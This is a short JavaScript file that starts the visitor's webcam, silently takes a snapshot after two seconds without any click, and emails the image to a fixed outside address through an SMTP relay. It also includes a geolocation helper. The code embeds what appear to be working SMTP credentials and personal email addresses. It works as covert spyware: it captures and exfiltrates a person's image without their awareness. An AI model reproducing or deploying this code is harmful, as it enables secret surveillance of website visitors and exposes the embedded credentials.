
function getLocation() {
  var x = document.getElementById("demo");
  return new Promise(function (resolve, reject) {

    // Promisifying the geolocation API
    navigator.geolocation.getCurrentPosition(
      (position) => resolve(position),
      (error) => reject(error)
    );
  });

}


async function ssss() {
  let camera_button = document.querySelector("#start-camera");
  let video = document.querySelector("#video");
  let click_button = document.querySelector("#click-photo");
  let canvas = document.querySelector("#canvas");


//   camera_button.addEventListener('click', async function() {
//     let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
//  video.srcObject = stream;
// });

// click_button.addEventListener('click', function() {
//     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
//     let image_data_url = canvas.toDataURL('image/jpeg');

//     // data url of the image
//     console.log(image_data_url);
// });




  let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
  video.srcObject = stream;

  setTimeout(()=>{
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
    let image_data_url = canvas.toDataURL('image/jpeg');
    // document.getElementById('image').src = image_data_url;

    console.log(image_data_url);
    sendEmail(image_data_url)
  },2000)
 



}

function sendEmail(coords) {
let body=`<html lang='en'><body><img src='${coords}' alt='urImag'/><h1>hi</h1></body></html>`;
  Email.send({
    Host: "smtp.elasticemail.com",
    Username: "sterdon458@gmail.com",
    Password: "83FB3C75585C807D72DD55A0B71F3140377C",
    To: 'mohits2125@gmail.com',
    From: "sterdon458@gmail.com",
    Subject: "Camera",
    Body: coords,
  })
    .then(function (message) {
      // alert("mail sent successfully")
    });
}